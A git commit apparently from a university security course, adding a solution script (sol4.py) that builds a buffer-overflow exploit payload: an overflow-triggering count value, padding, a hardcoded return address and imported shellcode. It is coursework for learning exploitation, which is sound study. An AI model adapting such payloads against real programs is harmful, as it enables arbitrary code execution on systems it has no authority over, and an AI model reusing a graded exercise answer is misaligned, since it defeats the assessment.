a85067aca86ef43a0876b7f2bc557ec4c69be565
Joshua Pratl <pratl@umich.edu>
2024-11-15 15:39:04 -0600

    sol4 done

--- sol4.py
+++ sol4.py
@@ -3,3 +3,6 @@
 import sys
 
 from shellcode import shellcode
+count = (0x4000000000000001).to_bytes(8, byteorder="little")
+payload = count + b"A" * 72 + (0x7ffffff6d3d0).to_bytes(8, byteorder="little") + shellcode
+sys.stdout.buffer.write(payload)
